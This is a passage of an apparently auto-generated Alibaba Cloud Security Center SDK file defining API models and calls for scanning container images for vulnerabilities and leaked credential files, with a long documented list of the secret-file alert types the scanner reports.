      sensitiveFileName?: string(name='SensitiveFileName'),
    }
  ](name='SensitiveFileList'),
  success?: boolean(name='Success'),
}

model DescribeImageSensitiveFileByKeyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileByKeyResponseBody(name='body'),
}

async function describeImageSensitiveFileByKeyWithOptions(tmpReq: DescribeImageSensitiveFileByKeyRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileByKeyResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileByKeyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileByKey(request: DescribeImageSensitiveFileByKeyRequest): DescribeImageSensitiveFileByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileByKeyWithOptions(request, runtime);
}

model DescribeImageSensitiveFileListRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google\\_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github\\_ssh_key**: GitHub SSH key
    *   **msbuild\\_publish_profile**: MSBuild publish profile
    *   **fastly\\_cdn_token**: Fastly CDN token
    *   **ssh\\_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord\\_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws\\_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker\\_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec\\_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s\\_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh\\_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common\\_database_cfg**: general database connection configuration
    *   **wordpress\\_database_cfg**: WordPress database configuration
    *   **googlecloud\\_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful\\_preview_token**: preview token for Contentful
    *   **php\\_database_cfg**: database password for a PHP application
    *   **atom\\_remote_sync**: Atom remote synchronization configuration
    *   **aws\\_session_token**: AWS session token
    *   **atom\\_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa\\_private_key**: RSA private key
    *   **github\\_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver\\_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github\\_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon\\_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp\\_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github\\_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs\\_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab\\_personal_toke**: personal access token for GitLab
    *   **rails\\_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun\\_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp\\_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku\\_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp\\_vault_token**: HashiCorp Vault token
    *   **pgp\\_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common\\_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix\\_web_passwd**: Phoenix web credential
    *   **puttygen\\_private_key**: PuTTYgen private key
    *   **google\\_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob\\_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr\\_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful\\_delivery_token**: delivery token for Contentful
    *   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa\\_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails\\_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic\\_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRange?: [ string ](name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListShrinkRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google\\_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github\\_ssh_key**: GitHub SSH key
    *   **msbuild\\_publish_profile**: MSBuild publish profile
    *   **fastly\\_cdn_token**: Fastly CDN token
    *   **ssh\\_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord\\_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws\\_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker\\_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec\\_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s\\_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh\\_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common\\_database_cfg**: general database connection configuration
    *   **wordpress\\_database_cfg**: WordPress database configuration
    *   **googlecloud\\_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful\\_preview_token**: preview token for Contentful
    *   **php\\_database_cfg**: database password for a PHP application
    *   **atom\\_remote_sync**: Atom remote synchronization configuration
    *   **aws\\_session_token**: AWS session token
    *   **atom\\_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa\\_private_key**: RSA private key
    *   **github\\_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver\\_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github\\_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon\\_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp\\_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github\\_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs\\_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab\\_personal_toke**: personal access token for GitLab
    *   **rails\\_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun\\_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp\\_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku\\_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp\\_vault_token**: HashiCorp Vault token
    *   **pgp\\_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common\\_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix\\_web_passwd**: Phoenix web credential
    *   **puttygen\\_private_key**: PuTTYgen private key
    *   **google\\_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob\\_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr\\_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful\\_delivery_token**: delivery token for Contentful
    *   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa\\_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails\\_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic\\_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRangeShrink?: string(name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8D19A089-E6BC-5244-800C-7E590D50487F'),
  sensitiveFileList?: [ 
    {
      count?: int32(name='Count', description='The number of scans that are performed on the sensitive file.', example='9'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1663321552000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type for the sensitive file. Valid values:

*   **npm_token**: npm access token
*   **ftp_cfg**: FTP configuration
*   **google\\_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github\\_ssh_key**: GitHub SSH key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN token
*   **ssh\\_private_key**: SSH private key
*   **aws_cli**: AWS CLI credential
*   **cpanel_proftpd**: cPanel ProFTPD credential
*   **postgresql_passwd**: PostgreSQL password file
*   **discord\\_client_cred**: Discord client credential
*   **rails_database**: Rails database configuration
*   **aws\\_access_key**: AWS access key
*   **esmtp_cfg** :configuration of ESMTP
*   **docker\\_registry_cfg**: configuration of a Docker image repository
*   **pem**: PEM
*   **common_cred**: common credential
*   **sftp_cfg**: SFTP connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec\\_private_key**: EC private key
*   **pypi_token**: upload token for the PyPI
*   **finicity_token**: Finicity token
*   **k8s\\_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh\\_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common\\_database_cfg**: general database connection configuration
*   **wordpress\\_database_cfg**: WordPress database configuration
*   **googlecloud\\_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful\\_preview_token**: preview token for Contentful
*   **php\\_database_cfg**: database password for a PHP application
*   **atom\\_remote_sync**: Atom remote synchronization configuration
*   **aws\\_session_token**: AWS session token
*   **atom\\_sftp_cfg**: Atom SFTP configuration
*   **tencentcloud_ak**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa\\_private_key**: RSA private key
*   **github\\_personal_token**: personal access token for GitHub
*   **pgp**: PGP encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: file upload credential for Rails Carrierwave
*   **dbeaver\\_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: credential for RoboMongo
*   **github\\_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS keychain
*   **amazon\\_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: JKS
*   **microsoft_sdf**: Microsoft SQL Server CE database
*   **kubernetes\\_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp\\_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github\\_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credential
*   **salesforce**: Sendinblue credential
*   **pkcs\\_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab\\_personal_toke**: personal access token for GitLab
*   **rails\\_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun\\_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp\\_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp\\_vault_token**: HashiCorp Vault token
*   **pgp\\_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common\\_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credential
*   **rubygems_cred**: RubyGems credential
*   **clojars_token**: Clojars token
*   **phoenix\\_web_passwd**: Phoenix web credential
*   **puttygen\\_private_key**: PuTTYgen private key
*   **google\\_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob\\_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr\\_private_key**: OTR private key
*   **contentful\\_delivery_token**: delivery token for Contentful
*   **digital\\_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa\\_private_key**: Digital DSA private key
*   **rails\\_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic\\_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: RubyGem token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='AccessKeyLeak'),
    }
  ](name='SensitiveFileList', description='An array that consists of the information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileListResponseBody(name='body'),
}

async function describeImageSensitiveFileListWithOptions(tmpReq: DescribeImageSensitiveFileListRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileListResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileListShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileList(request: DescribeImageSensitiveFileListRequest): DescribeImageSensitiveFileListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileListWithOptions(request, runtime);
}

model DescribeImageStatisticsResponseBody = {
  instanceCount?: int32(name='InstanceCount'),
  requestId?: string(name='RequestId'),
  riskInstanceCount?: int32(name='RiskInstanceCount'),
}

model DescribeImageStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageStatisticsResponseBody(name='body'),
}

async function describeImageStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeImageStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageStatistics(): DescribeImageStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageStatisticsWithOptions(runtime);
}

model DescribeImageVulListRequest {
  aliasName?: string(name='AliasName'),
  clusterId?: string(name='ClusterId'),
  clusterName?: string(name='ClusterName'),
  containerId?: string(name='ContainerId'),
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  digest?: string(name='Digest'),
  image?: string(name='Image'),
  instanceId?: string(name='InstanceId'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  namespace?: string(name='Namespace'),
  necessity?: string(name='Necessity'),
  pageSize?: int32(name='PageSize'),
  pod?: string(name='Pod'),
  regionId?: string(name='RegionId'),
  repoId?: string(name='RepoId'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  repoRegionId?: string(name='RepoRegionId'),
  scanRange?: [ string ](name='ScanRange'),
  statusList?: string(name='StatusList'),
  tag?: string(name='Tag'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
}

model DescribeImageVulListResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName'),
      canFix?: string(name='CanFix'),
      canUpdate?: boolean(name='CanUpdate'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      containerId?: string(name='ContainerId'),
      extendContentJson?: {
        os?: string(name='Os'),
        osRelease?: string(name='OsRelease'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion'),
            layer?: string(name='Layer'),
            matchDetail?: string(name='MatchDetail'),
            matchList?: [ string ](name='MatchList'),
            name?: string(name='Name'),
            path?: string(name='Path'),
            updateCmd?: string(name='UpdateCmd'),
            version?: string(name='Version'),
          }
        ](name='RpmEntityList'),
      }(name='ExtendContentJson'),
      firstTs?: long(name='FirstTs'),
      image?: string(name='Image'),
      imageDigest?: string(name='ImageDigest'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastTs?: long(name='LastTs'),
      layers?: [ string ](name='Layers'),
      maliciousSource?: string(name='MaliciousSource'),
      modifyTs?: long(name='ModifyTs'),
      name?: string(name='Name'),
      namespace?: string(name='Namespace'),
      necessity?: string(name='Necessity'),
      pod?: string(name='Pod'),
      primaryId?: long(name='PrimaryId'),
      related?: string(name='Related'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      scanTime?: long(name='ScanTime'),
      status?: int32(name='Status'),
      tag?: string(name='Tag'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      type?: string(name='Type'),
      uuid?: string(name='Uuid'),
    }
  ](name='VulRecords'),
}

model DescribeImageVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageVulListResponseBody(name='body'),
}

async function describeImageVulListWithOptions(request: DescribeImageVulListRequest, runtime: Util.RuntimeOptions): DescribeImageVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
